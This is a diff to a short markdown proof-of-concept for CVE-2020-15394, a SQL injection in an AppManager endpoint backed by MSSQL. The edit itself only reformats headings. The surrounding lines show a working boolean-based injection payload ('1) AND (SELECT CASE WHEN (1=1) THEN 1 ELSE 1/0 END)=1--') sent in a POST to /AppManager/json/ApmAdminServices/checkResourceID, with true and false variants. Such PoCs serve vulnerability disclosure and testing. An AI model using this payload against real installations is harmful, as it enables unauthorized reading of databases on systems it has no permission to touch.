@@ -1,7 +1,7 @@
 # PoC CVE
 ## CVE-2020-15394
-**DBMS: MSSQL**
-**TRUE** condition in sql query 
+- DBMS: MSSQL
+- TRUE condition in sql query 
 ```
 POST /AppManager/json/ApmAdminServices/checkResourceID HTTP/1.1
 Host: redacted.com
@@ -19,7 +19,7 @@ Date: Wed, 24 Nov 2021 09:39:56 GMT
 
 1) AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--
 ```
-**FALSE** condition in sql query
+- FALSE condition in sql query
 ```
 POST /AppManager/json/ApmAdminServices/checkResourceID HTTP/1.1
 Host: redacted.com
